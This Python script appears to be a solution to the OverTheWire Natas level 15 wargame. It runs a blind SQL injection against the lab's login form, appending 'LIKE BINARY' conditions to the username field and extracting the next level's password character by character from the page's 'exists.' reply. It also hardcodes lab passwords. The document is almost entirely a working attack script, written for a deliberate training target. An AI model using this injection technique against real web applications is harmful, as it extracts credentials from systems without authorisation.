import requests #imports requests library 
from requests import request

natas15 = "http://natas15.natas.labs.overthewire.org/index.php" #url to solve
natas16 = "http://natas16.natas.labs.overthewire.org/index.php" #url to get
username15 = "natas15" #puzzle access username
username16 = "natas16" #target username
password15 = "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J" # puzzle access password
passbuilder = "" #builder string to mine for password
keyspace = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ" #keyspace to mine - preinformed as per assignment, otherwise would be more inclusive
pwlen = 32 #known length of password
query = '''SELECT * from users where username=\"".$_REQUEST["username"]."\"''' # natas SQL code - for reference, unused
sqlStrStart = username16+'" and password LIKE BINARY"' # sql injection string pt.1
sqlStrEnd = '%" #' #sql injection string pt. 2
initialQuery = request("GET", natas15, auth=(username15,password15)) #checks connection to server
#response2 = request("GET", natas4, auth=("natas4","Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ"), headers)
if initialQuery.status_code == 200: #checks to make sure connection can be established to natas
    while len(passbuilder)<pwlen: #checks that the password has room to grow still
               for key in keyspace: #iterates through potential characters in password
                   print("Checking char " + key) #status to user
                   rdata = {'username' : sqlStrStart + passbuilder + key + sqlStrEnd} #builds string for sql inject
                   query = requests.post(natas15, auth=(username15,password15), data = rdata) # sends sql inject
                   if 'exists.' in query.text: #checks response to see if character candidate is in password or not
                       passbuilder = passbuilder + key #if so, add to end of password
                       print("###Character found. Current password is:###") # status to user
                       print(passbuilder) #prints current password progress to user
    print("Finished. Password should be: '" +passbuilder + "'! Checking...") #prints success message to user
    finalQuery = request("GET", natas16, auth=(username16,passbuilder)) #checks built password for authentication
    if finalQuery.status_code == 200: #if authenticated
        print("200 status. Password confirmed '"+passbuilder+"' for username natas16") #notify user of found password
else:
    print("Could not establish connection to server.") #error out to user
